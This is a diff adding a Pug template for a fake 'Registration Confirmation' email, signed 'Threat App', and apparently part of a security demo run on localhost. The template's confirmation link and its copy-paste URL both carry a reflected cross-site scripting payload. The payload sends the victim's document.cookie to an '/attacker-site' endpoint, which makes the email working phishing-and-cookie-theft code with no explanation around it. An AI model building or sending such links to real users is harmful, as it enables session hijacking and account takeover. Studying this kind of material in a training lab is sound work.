@@ -1,0 +1,22 @@
+doctype html
+html
+  head
+    title Registration Confirmation
+    link(rel="stylesheet", href="/stylesheets/style.css")
+  body
+    - target_url = `http://localhost:3000/after-registration?input=<script>document.location='http://localhost:3000/attacker-site?cookie='%2bdocument.cookie</script>&checkbox=${checkbox}`
+    h1 Registration Confirmation
+    p Thank you for registering with our service. Please confirm your registration by clicking the link below:
+
+    a(href=target_url, target=target_url) Confirm Registration    
+
+    p If the link above doesn't work, you can also copy and paste the following URL into your browser's address bar:
+
+    p #{target_url}
+
+    p If you did not register on our website, please disregard this email.
+
+    p Thank you for choosing our service. We look forward to serving you.
+
+    p Sincerely, Threat App
+
